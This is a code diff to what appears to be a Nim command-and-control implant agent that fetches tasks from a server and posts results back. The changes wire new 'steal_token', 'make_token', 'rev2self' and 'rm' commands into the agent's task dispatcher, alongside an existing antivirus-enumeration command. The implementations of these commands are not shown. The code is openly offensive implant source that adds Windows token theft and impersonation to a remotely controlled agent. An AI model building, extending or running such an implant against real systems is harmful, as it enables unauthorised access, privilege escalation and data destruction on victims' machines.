@@ -20,6 +20,11 @@ import tasks/mv
 import tasks/cd
 import tasks/ps
 import tasks/pwd
+import tasks/rm
+import tasks/token_manager
+import tasks/make_token
+import tasks/steal_token
+import tasks/rev2self
 
 # Windows-only commands
 when defined(windows):
@@ -154,16 +159,21 @@ proc getTasks*(agent: Agent): seq[JsonNode] =
   if response.len == 0:
     return @[]
   
+  var tasks: seq[JsonNode] = @[]
+  
   try:
     let respJson = parseJson(response)
+    
     if respJson.hasKey("tasks"):
-      result = respJson["tasks"].getElems()
+      tasks = respJson["tasks"].getElems()
       if agent.config.debug:
-        echo "[DEBUG] Received ", result.len, " task(s)"
+        echo "[DEBUG] Received ", tasks.len, " task(s)"
+    
+    return tasks
   except:
     if agent.config.debug:
       echo "[DEBUG] Failed to parse tasking: ", getCurrentExceptionMsg()
-    result = @[]
+    return @[]
 
 
 
@@ -397,6 +407,26 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           echo "[DEBUG] Executing pwd command"
         response = pwd(taskId, params)
       
+      of "rm":
+        if agent.config.debug:
+          echo "[DEBUG] Executing rm command"
+        response = rm(taskId, params)
+      
+      of "make_token":
+        if agent.config.debug:
+          echo "[DEBUG] Executing make_token command"
+        response = makeToken(taskId, params)
+      
+      of "steal_token":
+        if agent.config.debug:
+          echo "[DEBUG] Executing steal_token command"
+        response = stealToken(taskId, params)
+      
+      of "rev2self":
+        if agent.config.debug:
+          echo "[DEBUG] Executing rev2self command"
+        response = rev2self(taskId, params)
+      
       of "get_av":
         when defined(windows):
           if agent.config.debug:
@@ -481,7 +511,8 @@ proc postResponses*(agent: var Agent) =
     echo "[DEBUG] === POSTING RESPONSES ==="
     echo "[DEBUG] Posting ", agent.taskResponses.len, " response(s)"
   
-  let postMsg = %*{
+  # Separate interactive messages from regular responses
+  var postMsg = %*{
     "action": "post_response",
     "responses": agent.taskResponses
   }
